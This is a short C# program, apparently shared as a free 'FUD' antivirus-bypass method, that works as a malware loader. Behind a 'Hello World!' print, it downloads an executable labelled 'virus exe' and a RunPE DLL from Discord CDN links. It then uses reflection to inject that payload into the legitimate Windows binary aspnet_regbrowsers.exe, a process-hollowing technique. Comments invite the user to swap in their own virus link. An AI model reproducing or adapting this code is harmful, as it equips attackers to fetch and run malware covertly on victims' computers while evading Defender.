using System;
using System.Reflection;
namespace projects
{
    // BRAND NEW METHOD BY FRENCH CODER FUD 100% BYPASS DEFENDER [ FREE ]
    class Program
    {
        static void Main(string[] args)
        {
            System.Net.WebClient getmyapp = new System.Net.WebClient();

            Console.WriteLine("Hello World!");


            //put here your direct link virus exe :
            Uri uri = new Uri("https://cdn.discordapp.com/attachments/868414028681191447/876211059038498816/Client.exe");

            byte[] desenbyteler = getmyapp.DownloadData(uri);
            //put here your direct link RunPE.dll : 
            byte[] gotmethis = getmyapp.DownloadData("https://cdn.discordapp.com/attachments/868414028681191447/876212236425764884/RunPE.dll");

            object arabam = new object[] { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe", string.Empty, desenbyteler, true };

            string sosi = null;

            Assembly Tokum = Assembly.Load(gotmethis);

            Tokum.GetType("RunPE.RunPE").InvokeMember("Run", System.Reflection.BindingFlags.InvokeMethod, null, sosi, (object[])arabam);

        }
    }
}
